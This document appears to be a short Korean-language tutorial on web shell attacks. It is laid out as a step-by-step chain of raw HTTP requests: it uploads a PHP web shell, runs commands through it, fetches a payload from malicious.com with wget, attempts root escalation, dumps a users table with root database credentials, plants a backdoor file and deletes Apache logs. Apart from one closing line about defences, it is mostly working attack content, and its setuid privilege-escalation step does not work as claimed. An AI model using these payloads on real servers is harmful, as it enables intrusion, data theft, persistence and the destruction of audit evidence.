# LoL 웹쉘 공격 기법 소개
웹 요청 본문을 통해 침투한 파일을 웹셸(Web Shell)로 변환하고, 이를 활용해 추가 악성 행위를 수행하는 구체적인 공격 기법은 다음과 같습니다:

---

### **1. 웹 요청 본문을 통한 파일 업로드**
- 공격자는 HTTP POST 요청을 통해 웹 서버의 특정 디렉터리(예: `/var/www/html/`)에 악성 스크립트를 업로드합니다.
- 예를 들어, PHP 기반 웹 서버를 대상으로 한 웹셸 업로드:
```http
POST /upload.php HTTP/1.1
Host: targetsite.com
Content-Type: multipart/form-data; boundary=---WebKitFormBoundary
Content-Length: 1234

---WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="webshell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
---WebKitFormBoundary--
```

- **결과:** 서버에 `webshell.php` 파일이 업로드되며, 이를 통해 원격 명령 실행이 가능해집니다.

---

### **2. 업로드된 웹셸 호출**
- 업로드된 웹셸을 HTTP GET 요청으로 호출하여 명령어를 실행합니다.
- 예제 요청:
```http
GET /webshell.php?cmd=ls HTTP/1.1
Host: targetsite.com
```
- **결과:** 서버 디렉터리 내 파일 목록이 반환됩니다.

---

### **3. 악성 코드 추가 다운로드 및 실행**
- 웹셸을 통해 원격 URL에서 악성 코드를 다운로드하고 실행합니다.
- 웹 요청 예제:
```http
GET /webshell.php?cmd=wget+http://malicious.com/payload.sh+-O+/tmp/payload.sh HTTP/1.1
Host: targetsite.com
```
- **결과:** `payload.sh` 파일이 다운로드되고, 이를 실행하여 시스템에 추가적인 악성 코드를 설치합니다.

---

### **4. 권한 상승**
- 업로드된 웹셸을 통해 서버의 권한 상승 취약점을 악용합니다.
- 예제:
```http
GET /webshell.php?cmd=python+-c+"import+os;os.setuid(0);os.system('/bin/bash')" HTTP/1.1
Host: targetsite.com
```
- **결과:** 루트 권한을 획득하여 서버 제어권을 장악합니다.

---

### **5. 데이터 탈취**
- 웹셸을 활용하여 데이터베이스 자격 증명을 추출하고, 데이터베이스를 직접 조회합니다.
- 예제:
```http
GET /webshell.php?cmd=mysql+-u+root+-psecret+-e+"SELECT+*+FROM+users;" HTTP/1.1
Host: targetsite.com
```
- **결과:** 데이터베이스에서 사용자 정보가 탈취됩니다.

---

### **6. 백도어 설치**
- 공격자는 지속적인 접근을 위해 백도어를 설치합니다.
- 예제:
```http
GET /webshell.php?cmd=echo+'<?php+system($_GET[cmd]);?>'+>+/var/www/html/backdoor.php HTTP/1.1
Host: targetsite.com
```
- **결과:** 새로운 웹셸 `backdoor.php`가 생성됩니다.

---

### **7. 분산 서비스 거부(DDoS) 공격 수행**
- 웹셸을 사용해 대상 서버를 봇넷 네트워크의 일부로 전환합니다.
- 예제:
```http
GET /webshell.php?cmd=perl+-e+'use+IO::Socket;...;+send_attack();' HTTP/1.1
Host: targetsite.com
```
- **결과:** 서버가 DDoS 공격에 사용됩니다.

---

### **8. 로그 삭제**
- 공격자가 자신의 흔적을 삭제합니다.
- 예제:
```http
GET /webshell.php?cmd=rm+-rf+/var/log/apache2/* HTTP/1.1
Host: targetsite.com
```
- **결과:** 서버 로그가 삭제되어 공격 추적이 어려워집니다.

---

이 기법들은 방어되지 않은 파일 업로드 기능, 잘못된 입력 검증, 그리고 웹 서버 취약점을 악용하여 수행됩니다. **적절한 보안 조치**를 통해 이러한 공격을 방지할 수 있습니다.
